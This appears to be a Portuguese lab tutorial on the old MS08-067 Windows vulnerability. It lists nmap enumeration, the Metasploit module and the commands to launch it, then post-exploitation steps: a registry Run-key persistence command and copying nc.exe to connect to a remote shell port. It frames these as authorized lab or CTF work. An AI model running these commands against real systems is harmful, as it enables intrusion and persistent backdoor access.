# 🪟 MS08-067 — Exploração

## 🧠 O que é MS08-067?

**MS08-067** é o boletim de segurança da Microsoft referente a uma vulnerabilidade crítica no serviço **Server Service** de versões antigas do Windows.

A falha podia permitir **execução remota de código (RCE)** por meio de requisições especialmente elaboradas.

É uma vulnerabilidade histórica, principalmente associada ao **Windows XP e Windows Server 2003**, e ficou conhecida por ter sido explorada por malwares como o **Conficker**.

---

## 🔎 Identificação

Durante um teste autorizado, o Nmap pode ser utilizado para identificar serviços SMB e auxiliar na enumeração do alvo:

```bash
nmap -sV -p 139,445 <IP>
```

---

## 💥 Exploração com Metasploit

O módulo correspondente no Metasploit é:

```text
msfconsole

use exploit/windows/smb/ms08_067_netapi
```

Depois, devem ser configurados os parâmetros necessários para o laboratório, como:

```text
show options
set RHOSTS <IP_DO_ALVO>
```

E então executar o módulo:

```text
run
```

ou:

```text
exploit
```

---

## 🧪 Pós-exploração

Depois de obter uma sessão autorizada, ferramentas do Windows podem ser utilizadas para verificar configurações do sistema.

Por exemplo, a enumeração da inicialização automática pode ser feita com:

```text
reg enumkey -k HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

Essa chave é relevante porque programas registrados nela podem ser executados durante a inicialização do Windows.

---

## ⚠️ Persistência

O trecho original utiliza:

```text
reg setval -k HKLM\Software\Microsoft\Windows\CurrentVersion\RUN
```

para adicionar um programa à inicialização automática.

Essa técnica representa **persistência**, e não a exploração do MS08-067 em si.

Em um material didático, vale separar:

```text
MS08-067
   │
   └── Exploração → RCE
                     │
                     ▼
              Pós-exploração
                     │
                     └── Persistência
```

---

## 📦 Netcat

O material original também utiliza o `nc.exe` como mecanismo de acesso remoto:

```bash
cp /root/Download/nc.exe /root/Desktop/nc.exe
```

E posteriormente tenta estabelecer uma conexão com:

```bash
nc <IP> 1111
```

⚠️ Como `nc.exe` pode ser utilizado para criar shells remotos e persistência, mantenha essa parte restrita ao seu laboratório/CTF autorizado.
